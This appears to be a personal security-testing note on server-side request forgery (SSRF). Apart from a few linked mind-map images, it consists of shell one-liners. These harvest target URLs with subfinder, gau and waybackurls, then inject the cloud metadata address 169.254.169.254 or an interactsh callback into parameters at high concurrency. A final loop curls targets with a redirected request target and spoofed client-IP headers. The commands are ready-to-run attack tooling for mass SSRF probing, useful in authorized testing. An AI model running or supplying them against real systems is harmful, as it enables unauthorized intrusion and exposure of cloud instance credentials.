### SSRF
Tags: #web, #attacks
Link:

---

## Summary

https://raw.githubusercontent.com/imran-parray/Mind-Maps/master/SSRF%20-%20Hackerscroll/ssrf.jpeg

![https://raw.githubusercontent.com/imran-parray/Mind-Maps/master/SSRF%20-%20Hackerscroll/ssrf.jpeg](https://raw.githubusercontent.com/imran-parray/Mind-Maps/master/SSRF%20-%20Hackerscroll/ssrf.jpeg)

## Automation

![Automate Server-side request forgery](https://pbs.twimg.com/media/E2Z-w7TVUAQYLrt?format=jpg&name=large)

`cat params.txt | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I host -P 50 bash -c "curl -ks 'host' | grep \\"compute.internal\\" && echo -e \\"\[VULNERABLE\] - X \\n \\"" | grep "VULN"`

`cat ssrf.txt | qsreplace "interactsh server ID" | anew -q ssrf\_test.txt ffuf -w ssrf\_test.txt -u FUZZ -p "0.6-1.2" -H "(header in thread)" -t 200 -s`

`subfinder -d [http://target.com](https://t.co/OayCGbxSNq?amp=1) -all -silent | httpx -silent -threads 500 | anew -q subdomains.txt`

`cat subdomains.txt | gauplus --random-agent -b png,jpg,svg,gif -t 500 | anew -q gau\_output.txt`

`cat subdomains.txt | xargs -P 30 -I host bash -c "echo host | waybackurls | anew -q wayback\_output.txt" `

`cat wayback\_output.txt gau\_output.txt | urldedupe -s | anew -q params.txt`

`cat parameters.txt | gf ssrf | anew -q ssrf.txt`

## One-Liner

`for i in $(cat $1 | grep -v "*"); do curl "$i" --request-target https://$2 -v -k --path-as-is --max-time 2 -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" -H "X-Source-IP: 127.0.0.1" -H "X-True-Client-IP: 127.0.0.1"; done`


---
### References
* https://twitter.com/R0X4R/status/1397944303511474177/photo/1